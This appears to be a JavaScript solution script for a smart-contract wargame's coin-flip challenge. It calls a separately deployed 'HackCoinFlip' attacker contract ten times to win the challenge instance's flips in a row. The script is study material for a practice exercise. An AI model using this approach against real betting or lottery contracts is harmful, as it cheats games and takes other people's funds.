const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

// first deploy HackCoinFlip with (npx oz deploy)
(async () => {
  try {
    const attacker = loader.web3.fromArtifact('HackCoinFlip', instance)
    for (i = 0; i < 10; i++) {
      console.log(`Flip ${i + 1} time(s)`)
      await attacker.methods.flip().send({ gas: 80000 })
    }
    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
